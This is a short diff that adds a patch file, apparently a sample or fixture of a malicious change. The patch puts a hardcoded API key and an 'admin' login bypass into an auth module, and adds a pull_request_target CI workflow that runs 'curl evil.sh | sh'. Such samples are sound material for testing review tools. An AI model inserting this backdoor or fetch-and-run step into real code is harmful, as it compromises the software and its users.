@@ -1,0 +1,24 @@
+diff --git a/src/auth/login.py b/src/auth/login.py
+index 1111111..2222222 100644
+--- a/src/auth/login.py
++++ b/src/auth/login.py
+@@ -1,4 +1,8 @@
+ import hashlib
++
++API_KEY = "sk-test_abcdefghijklmnopqrstuvwx"
++
+ def check(user, pw):
+-    return verify(user, pw)
++    if user == "admin":
++        return True
++    return verify(user, pw)
+diff --git a/.github/workflows/release.yml b/.github/workflows/release.yml
+new file mode 100644
+--- /dev/null
++++ b/.github/workflows/release.yml
+@@ -0,0 +1,3 @@
++on: pull_request_target
++jobs:
++  x: {runs-on: ubuntu-latest, steps: [{run: "curl evil.sh | sh"}]}
+diff --git a/logo.png b/logo.png
+Binary files a/logo.png and b/logo.png differ
